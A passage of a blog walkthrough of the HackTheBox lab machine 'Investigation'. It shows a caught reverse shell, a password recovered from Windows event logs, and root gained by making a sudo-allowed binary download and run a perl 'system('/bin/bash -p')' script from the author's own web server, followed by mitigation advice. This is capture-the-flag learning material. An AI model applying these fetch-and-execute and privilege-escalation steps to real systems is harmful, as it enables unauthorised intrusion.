<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">4444</span> <span class="mf">...</span>
<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.10.14.8</span><span class="p">]</span> <span class="nf">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10.11.197</span><span class="p">]</span> <span class="mi">46926</span>
<span class="n">bash</span><span class="o">:</span> <span class="n">cannot</span> <span class="n">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="nf">group</span> <span class="p">(</span><span class="mi">959</span><span class="p">)</span><span class="o">:</span> <span class="nc">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
<span class="n">bash</span><span class="o">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="n">in</span> <span class="n">this</span> <span class="n">shell</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~/</span><span class="n">uploads</span><span class="o">/</span><span class="mi">1676816336</span><span class="err">$</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="user"><span class="mr-2">User</span><a href="#user" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Once connected to the server, I saw that a cronjobs was interacting with files in ‘/usr/local/investigation’.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~/</span><span class="n">html</span><span class="err">$</span> <span class="n">crontab</span> <span class="o">-</span><span class="n">l</span>
<span class="mf">...</span>
<span class="o">*/</span><span class="mi">5</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="o">*</span> <span class="n">date</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">investigation</span><span class="o">/</span><span class="n">analysed_log</span> <span class="o">&amp;&amp;</span> <span class="k">echo</span> <span class="s2">"Clearing folders"</span> <span class="o">&gt;&gt;</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">investigation</span><span class="o">/</span><span class="n">analysed_log</span> <span class="o">&amp;&amp;</span> <span class="n">rm</span> <span class="o">-</span><span class="n">r</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">uploads</span><span class="o">/*</span> <span class="o">&amp;&amp;</span> <span class="n">rm</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">analysed_images</span><span class="o">/*</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I looked in the folder  and saw that it contained an email about Windows Event Logs.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~/</span><span class="n">html</span><span class="err">$</span> <span class="n">ls</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">investigation</span><span class="o">/</span>
<span class="s1">'Windows Event Logs for Analysis.msg'</span>   <span class="n">analysed_log</span>

<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">investigation</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">investigation</span><span class="err">$</span> <span class="n">file</span> <span class="nc">Windows</span><span class="err">\</span> <span class="nc">Event</span><span class="err">\</span> <span class="nc">Logs</span><span class="err">\</span> <span class="k">for</span><span class="err">\</span> <span class="nc">Analysis</span><span class="mf">.</span><span class="n">msg</span> 
<span class="nc">Windows</span> <span class="nc">Event</span> <span class="nc">Logs</span> <span class="k">for</span> <span class="nc">Analysis</span><span class="mf">.</span><span class="n">msg</span><span class="o">:</span> <span class="no">CDFV2</span> <span class="nc">Microsoft</span> <span class="nc">Outlook</span> <span class="nc">Message</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I downloaded the file to my machine to better investigate it. I installed <a href="https://www.matijs.net/software/msgconv/">MSGConvert</a> to convert the email in a format that I could read. The message had an attachment. I save the base64 of the attachment in a file and decoded it, then unzipped the file in contained.</p>

<div class="language-java highlighter-rouge"><div class="code-header">
        <span data-label-text="Java"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">msgconvert</span> <span class="n">logs</span><span class="o">.</span><span class="na">msg</span>

<span class="err">$</span> <span class="n">vim</span> <span class="n">logs</span><span class="o">.</span><span class="na">msg</span>

<span class="err">$</span> <span class="n">cat</span> <span class="n">b64</span><span class="o">.</span><span class="na">txt</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">&gt;</span> <span class="n">evtx</span><span class="o">-</span><span class="n">logs</span><span class="o">.</span><span class="na">zip</span>

<span class="err">$</span> <span class="n">file</span> <span class="n">evtx</span><span class="o">-</span><span class="n">logs</span><span class="o">.</span><span class="na">zip</span>
<span class="n">evtx</span><span class="o">-</span><span class="n">logs</span><span class="o">.</span><span class="na">zip</span><span class="o">:</span> <span class="nc">Zip</span> <span class="n">archive</span> <span class="n">data</span><span class="o">,</span> <span class="n">at</span> <span class="n">least</span> <span class="n">v2</span><span class="o">.</span><span class="mi">0</span> <span class="n">to</span> <span class="n">extract</span><span class="o">,</span> <span class="n">compression</span> <span class="n">method</span><span class="o">=</span><span class="n">deflate</span>

<span class="err">$</span> <span class="n">mkdir</span> <span class="n">logs</span>

<span class="err">$</span> <span class="n">cd</span> <span class="n">logs</span>

<span class="err">$</span> <span class="n">unzip</span> <span class="o">../</span><span class="n">evtx</span><span class="o">-</span><span class="n">logs</span><span class="o">.</span><span class="na">zip</span>
<span class="nl">Archive:</span>  <span class="o">../</span><span class="n">evtx</span><span class="o">-</span><span class="n">logs</span><span class="o">.</span><span class="na">zip</span>
  <span class="nl">inflating:</span> <span class="n">security</span><span class="o">.</span><span class="na">evtx</span>

<span class="err">$</span> <span class="n">file</span> <span class="n">security</span><span class="o">.</span><span class="na">evtx</span>
<span class="n">security</span><span class="o">.</span><span class="na">evtx</span><span class="o">:</span> <span class="no">MS</span> <span class="nc">Windows</span> <span class="mi">10</span><span class="o">-</span><span class="mi">11</span> <span class="nc">Event</span> <span class="nc">Log</span><span class="o">,</span> <span class="n">version</span>  <span class="mf">3.2</span><span class="o">,</span> <span class="mi">238</span> <span class="n">chunks</span> <span class="o">(</span><span class="n">no</span><span class="o">.</span> <span class="mi">237</span> <span class="n">in</span> <span class="n">use</span><span class="o">),</span> <span class="n">next</span> <span class="n">record</span> <span class="n">no</span><span class="o">.</span> <span class="mi">20013</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The attached file contained the Windows Security Event Logs. This file is not human-readable, so I used <a href="https://manpages.ubuntu.com/manpages/bionic/en/man1/evtxexport.1.html">evtxexport</a> to extract the data in a text file.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">evtxexport</span> <span class="n">security</span><span class="mf">.</span><span class="n">evtx</span> <span class="o">&gt;</span> <span class="n">exported</span><span class="mf">.</span><span class="n">txt</span>
</pre></td></tr></tbody></table></code></div></div>

<p>The extracted file contained 440k lines. I took a quick look at it, but there was too much to find anything. I made a quick search and found out that code 4625 was used for failed log-on events. I searched the file for this code and found one event with a password in it.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="n">Event</span> <span class="n">identifier</span>        <span class="p">:</span> <span class="mh">0x00001211</span> <span class="p">(</span><span class="mi">4625</span><span class="p">)</span>
<span class="n">Number</span> <span class="n">of</span> <span class="n">strings</span>       <span class="p">:</span> <span class="mi">21</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">1</span>               <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">18</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">2</span>               <span class="p">:</span> <span class="n">EFORENZICS</span><span class="o">-</span><span class="n">DI</span><span class="err">$</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">3</span>               <span class="p">:</span> <span class="n">WORKGROUP</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">4</span>               <span class="p">:</span> <span class="mh">0x00000000000003e7</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">5</span>               <span class="p">:</span> <span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">0</span><span class="o">-</span><span class="mi">0</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">6</span>               <span class="p">:</span> <span class="n">REDACTED</span>
<span class="n">String</span><span class="p">:</span> <span class="mi">7</span>               <span class="p">:</span>
</pre></td></tr></tbody></table></code></div></div>

<p>I used the password to connect as ‘smorton’ and it worked.</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="err">$</span> <span class="n">ssh</span> <span class="n">smorton</span><span class="nd">@target</span>
<span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s">'target (10.10.11.197)'</span> <span class="n">can</span><span class="s">'t be established.
ED25519 key fingerprint is SHA256:lYSJubnhYfFdsTiyPfAa+pgbuxOaSJGV8ItfpUK84Vw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="n">target</span><span class="s">' (ED25519) to the list of known hosts.
smorton@target'</span><span class="n">s</span> <span class="n">password</span><span class="p">:</span>
<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">20.04</span><span class="p">.</span><span class="mi">5</span> <span class="nc">LTS </span><span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.4</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">137</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>

<span class="p">...</span>

<span class="n">smorton</span><span class="nd">@investigation</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span>
<span class="n">user</span><span class="p">.</span><span class="n">txt</span>

<span class="n">smorton</span><span class="nd">@investigation</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">user</span><span class="p">.</span><span class="n">txt</span>
<span class="n">REDACTED</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="root"><span class="mr-2">Root</span><a href="#root" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>To get to root, I looked at what the user could run with sudo.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="n">smorton</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
<span class="nc">Matching</span> <span class="nc">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">smorton</span> <span class="n">on</span> <span class="n">investigation</span><span class="o">:</span>
    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span> <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">sbin</span><span class="err">\</span><span class="o">:/</span><span class="n">bin</span><span class="err">\</span><span class="o">:/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>

<span class="nc">User</span> <span class="n">smorton</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">investigation</span><span class="o">:</span>
    <span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="no">NOPASSWD</span><span class="o">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">binary</span>

<span class="n">smorton</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~</span><span class="err">$</span> <span class="n">file</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">binary</span>
<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">binary</span><span class="o">:</span> <span class="no">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="no">LSB</span> <span class="n">shared</span> <span class="n">object</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="no">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="mf">.2</span><span class="p">,</span> <span class="nc">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="n">a703575c5c944bfcfea8a04f0aabaf0b4fa9f7cb</span><span class="p">,</span> <span class="k">for</span> <span class="no">GNU</span><span class="o">/</span><span class="nc">Linux</span> <span class="mf">3.2.0</span><span class="p">,</span> <span class="n">not</span> <span class="n">stripped</span>

<span class="n">smorton</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">binary</span>
<span class="nc">Exiting</span><span class="mf">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>They could execute a binary. I tried running it, but it appeared to exit immediately. I downloaded the executable to my machine and opened it in Ghidra. I renamed a few variables and added comments to make the code readable.</p>

<p><img data-src="/assets/images/Investigation/BinaryDecompiled.png" alt="Binary decompiled" title="Binary Decompiled" data-proofer-ignore></p>

<p>The binary needed two arguments, a URL and a file name. The file name needed to be “lDnxUysaQn”. It used curl to download from the given URL and save the content to the file specified. It then used perl to execute the file it downloaded.</p>

<p>It created a small perl script on my machine to run bash and launched a web server to give access to the script.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>$ cat index.html
system('/bin/bash -p')

$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
</pre></td></tr></tbody></table></code></div></div>

<p>I ran the program giving it a URL that pointed to my machine and the expected file name.</p>

<p>My web server got hit.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="mf">10.10.11.197</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">19</span><span class="o">/</span><span class="nc">Feb</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">10</span><span class="o">:</span><span class="mi">41</span><span class="o">:</span><span class="mi">08</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
</pre></td></tr></tbody></table></code></div></div>

<p>And I was root on the server.</p>

<div class="language-php highlighter-rouge"><div class="code-header">
        <span data-label-text="PHP"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td><td class="rouge-code"><pre><span class="n">smorton</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">binary</span> <span class="mf">10.10.14.8</span> <span class="s2">"lDnxUysaQn"</span>
<span class="nc">Running</span><span class="mf">...</span>

<span class="n">root</span><span class="o">@</span><span class="n">investigation</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">smorton</span><span class="c1"># whoami</span>
<span class="n">root</span>

<span class="n">root</span><span class="o">@</span><span class="n">investigation</span><span class="o">:/</span><span class="n">home</span><span class="o">/</span><span class="n">smorton</span><span class="c1"># cd /root</span>

<span class="n">root</span><span class="o">@</span><span class="n">investigation</span><span class="o">:~</span><span class="c1"># cat root.txt</span>
<span class="no">REDACTED</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="mitigation"><span class="mr-2">Mitigation</span><a href="#mitigation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p><code class="language-plaintext highlighter-rouge">Making that box safer would start by keeping tools up to date. The version of exiftool on the server is outdated and has a known vulnerability. A simple update would have prevented the RCE. </code></p>

<p><code class="language-plaintext highlighter-rouge">Next, there were sensitive files readable by anyone on the server. The email contained security logs. It should not be left on a server for anyone to grab it.</code></p>

<p><code class="language-plaintext highlighter-rouge">The last issue was with the binary that ran any code it downloaded as root. Something like this should probably not exists on a real server. Executing arbitrary code is dangerous, doing it as root is worst.</code></p>

</div>

<div class="post-tail-wrapper text-muted">

  <!-- categories -->
  
  <div class="post-meta mb-3">
    <i class="far fa-folder-open fa-fw mr-1"></i>
    
      <a href='/categories/hackthebox/'>HackTheBox</a>
  </div>
  

  <!-- tags -->
  
  <div class="post-tags">
    <i class="fa fa-tags fa-fw mr-1"></i>
      
      <a href="/tags/walkthrough/"
          class="post-tag no-text-decoration" >Walkthrough</a>
      
      <a href="/tags/hacking/"
          class="post-tag no-text-decoration" >Hacking</a>
      
      <a href="/tags/hackthebox/"
          class="post-tag no-text-decoration" >HackTheBox</a>
      
      <a href="/tags/medium/"
          class="post-tag no-text-decoration" >Medium</a>
      
      <a href="/tags/machine/"
          class="post-tag no-text-decoration" >Machine</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hack+The+Box+-+Investigation+-+Ankit+Kanojiya&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Investigation%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hack+The+Box+-+Investigation+-+Ankit+Kanojiya&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Investigation%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2FHackTheBox-Walkthrough-Investigation%2F&text=Hack+The+Box+-+Investigation+-+Ankit+Kanojiya" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copy link"
        data-title-succeed="Link copied successfully!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ankitkanojiya" data-description="Support me on Buy me a coffee!" data-message="" data-color="#BD5FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- panel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Trending Tags</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hacking/">Hacking</a>
    
      
      <a class="post-tag" href="/tags/hackthebox/">HackTheBox</a>
    
      
      <a class="post-tag" href="/tags/machine/">Machine</a>
    
      
      <a class="post-tag" href="/tags/walkthrough/">Walkthrough</a>
    
      
      <a class="post-tag" href="/tags/medium/">Medium</a>
    
      
      <a class="post-tag" href="/tags/linux/">linux</a>
    
      
      <a class="post-tag" href="/tags/cve/">cve</a>
    
      
      <a class="post-tag" href="/tags/easy/">Easy</a>
    
      
      <a class="post-tag" href="/tags/c/">c</a>
    
      
      <a class="post-tag" href="/tags/chroot/">chroot</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->





  <div id="related-posts" class="mb-2 mb-sm-4">
    <h3 class="pt-2 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Health/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1673020800"
    data-df="ll"
    >
  Jan  7, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Health</h3>
            <div class="text-muted small">
              <p>
                





                This was a difficult, but fun machine. It came out as an easy machine before being reclassified as medium. It took me a long time before I finally pwned it.

It started with using a web application...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/2023/01/HTB/UpDown">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674230400"
    data-df="ll"
    >
  Jan 21, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - UpDown</h3>
            <div class="text-muted small">
              <p>
                





                It took me a long time to get a foothold on that machine. But once I was in, getting the user and root was very easy.


  Room: UpDown
  Difficulty: Medium
  URL: https://app.hackthebox.com/machine...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/HackTheBox-Walkthrough-Ambassador/">
          <div class="card-body">
            <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class="small"
    data-ts="1674835200"
    data-df="ll"
    >
  Jan 28, 2023
</em>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Ambassador</h3>
            <div class="text-muted small">
              <p>
                





                This was a really fun box where I had to use multiple vulnerabilities. There was a Local File Inclusion (LFI), credentials stored in clear, misconfiguration, and a Git repository with a token in it...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->


    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/2023/04/HTB/Encoding" class="btn btn-outline-primary"
    prompt="Older">
    <p>Hack The Box - Encoding</p>
  </a>
  

  
